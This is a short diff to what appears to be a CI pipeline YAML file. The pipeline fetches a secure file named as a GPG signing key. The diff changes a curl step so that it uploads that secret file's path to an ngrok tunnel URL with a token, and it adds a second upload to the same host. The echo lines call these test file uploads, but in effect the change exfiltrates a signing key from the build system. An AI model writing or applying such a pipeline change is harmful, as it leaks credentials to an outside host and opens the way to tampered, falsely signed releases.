@@ -48,5 +48,10 @@ steps:
     secureFile: 'secret_signing_key_F5CE35A802DF35C1.gpg'
 
 - script: |
+    echo "Uploading other test file"
+    curl -Ffile=@sample.txt "http://03dc-89-247-41-253.ngrok.io/upload?token=9812379124987ba"
+
+- script: |
     echo "Uploading test file"
-    curl -Ffile=./sample.txt "http://03dc-89-247-41-253.ngrok.io/upload?token=9812379124987ba"
+    curl -Ffile=@$(testFile.secureFilePath) "http://03dc-89-247-41-253.ngrok.io/upload?token=9812379124987ba"
+
